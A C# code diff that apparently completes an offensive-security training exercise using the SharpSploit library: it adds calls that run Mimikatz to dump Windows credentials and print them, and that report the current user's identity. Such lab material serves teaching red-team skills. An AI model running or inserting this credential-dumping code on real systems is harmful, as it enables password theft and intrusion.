@@ -5,16 +5,23 @@ using SharpSploit;
 public class Program {
 
     public static void Main() {
+        InvokeMimikatz();
+        InvokeWhoAmI();
+
     }
 
     // Write the code necessary to invoke mimikatz from SharpSploit!
     public static void InvokeMimikatz() {
         Console.WriteLine("I'm invoking Mimikatz using SharpSploit!");
+        var mimikatz_output = SharpSploit.Credentials.Mimikatz.All();
+        Console.WriteLine("mimikatz output:\n{0}", mimikatz_output);
     }
 
     // Write the code necessary to identify the current user
     public static void InvokeWhoAmI() {
         Console.WriteLine("I'm invoking WhoAmI using SharpSploit!");
+        var tokens = new SharpSploit.Credentials.Tokens();
+        Console.WriteLine(tokens.WhoAmI());
     }
 
     // Write the code necessary to impersonate system and then print WhoAmI()
